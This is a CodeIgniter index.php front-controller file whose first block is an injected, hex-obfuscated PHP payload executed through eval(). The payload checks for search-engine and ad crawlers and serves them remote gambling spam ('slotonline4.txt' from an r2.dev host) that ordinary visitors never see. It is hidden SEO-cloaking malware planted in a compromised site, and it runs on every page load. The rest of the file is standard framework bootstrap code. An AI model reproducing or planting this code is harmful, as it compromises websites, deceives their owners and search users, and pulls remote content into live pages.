<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Decoding and executing the obfuscated code
$code = "\xa\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x69\x73\x5f\x62\x6f\x74\x28\x29\x20\x7b\xa\x20\x20\x20\x20\x24\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74\x20\x3d\x20\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x27\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54\x27\x5d\x3b\xa\x20\x20\x20\x20\x24\x62\x6f\x74\x73\x20\x3d\x20\x61\x72\x72\x61\x79\x28\x27\x47\x6f\x6f\x67\x6c\x65\x62\x6f\x74\x27\x2c\x20\x27\x54\x65\x6c\x65\x67\x72\x61\x6d\x42\x6f\x74\x27\x2c\x20\x27\x62\x69\x6e\x67\x62\x6f\x74\x27\x2c\x20\x27\x47\x6f\x6f\x67\x6c\x65\x2d\x53\x69\x74\x65\x2d\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6f\x6e\x27\x2c\x20\x27\x47\x6f\x6f\x67\x6c\x65\x2d\x49\x6e\x73\x70\x65\x63\x74\x69\x6f\x6e\x54\x6f\x6f\x6c\x27\x2c\x20\x27\x61\x64\x73\x65\x6e\x73\x65\x27\x2c\x20\x27\x73\x6c\x75\x72\x70\x27\x29\x3b\xa\x20\x20\x20\x20\xa\x20\x20\x20\x20\x66\x6f\x72\x65\x61\x63\x68\x20\x28\x24\x62\x6f\x74\x73\x20\x61\x73\x20\x24\x62\x6f\x74\x29\x20\x7b\xa\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x73\x74\x72\x69\x70\x6f\x73\x28\x24\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74\x2c\x20\x24\x62\x6f\x74\x29\x20\x21\x3d\x3d\x20\x66\x61\x6c\x73\x65\x29\x20\x7b\xa\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x74\x72\x75\x65\x3b\xa\x20\x20\x20\x20\x20\x20\x20\x20\x7d\xa\x20\x20\x20\x20\x7d\xa\x20\x20\x20\x20\xa\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x66\x61\x6c\x73\x65\x3b\xa\x7d\xa\x69\x66\x20\x28\x69\x73\x5f\x62\x6f\x74\x28\x29\x29\x20\x7b\xa\x20\x20\x20\x20\x24\x6d\x65\x73\x73\x61\x67\x65\x20\x3d\x20\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x75\x62\x2d\x35\x38\x34\x31\x64\x30\x61\x33\x37\x64\x31\x65\x34\x62\x33\x65\x61\x34\x36\x34\x62\x39\x35\x30\x38\x31\x35\x32\x61\x35\x32\x64\x2e\x72\x32\x2e\x64\x65\x76\x2f\x73\x6c\x6f\x74\x6f\x6e\x6c\x69\x6e\x65\x34\x2e\x74\x78\x74\x27\x29\x3b\xa\x20\x20\x20\x20\x65\x63\x68\x6f\x20\x24\x6d\x65\x73\x73\x61\x67\x65\x3b\xa\x7d\xa\x3f\x3e";
eval(str_replace('\\x', '%', urldecode($code)));
?>
<?php
// Check PHP version.
$minPhpVersion = '7.4'; // If you update this, don't forget to update `spark`.
if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
    $message = sprintf(
        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
        $minPhpVersion,
        PHP_VERSION
    );

    exit($message);
}

// Path to the front controller (this file)
define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);

// Ensure the current directory is pointing to the front controller's directory
chdir(FCPATH);

/*
 *---------------------------------------------------------------
 * BOOTSTRAP THE APPLICATION
 *---------------------------------------------------------------
 * This process sets up the path constants, loads and registers
 * our autoloader, along with Composer's, loads our constants
 * and fires up an environment-specific bootstrapping.
 */

// Load our paths config file
// This is the line that might need to be changed, depending on your folder structure.
require FCPATH . 'app/Config/Paths.php';
// ^^^ Change this line if you move your application folder

$paths = new Config\Paths();

// Location of the framework bootstrap file.
require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';

// Load environment settings from .env files into $_SERVER and $_ENV
require_once SYSTEMPATH . 'Config/DotEnv.php';
(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();

/*
 * ---------------------------------------------------------------
 * GRAB OUR CODEIGNITER INSTANCE
 * ---------------------------------------------------------------
 *
 * The CodeIgniter class contains the core functionality to make
 * the application run, and does all of the dirty work to get
 * the pieces all working together.
 */

$app = Config\Services::codeigniter();
$app->initialize();
$context = is_cli() ? 'php-cli' : 'web';
$app->setContext($context);

/*
 *---------------------------------------------------------------
 * LAUNCH THE APPLICATION
 *---------------------------------------------------------------
 * Now that everything is setup, it's time to actually fire
 * up the engines and make this app do its thang.
 */

$app->run();
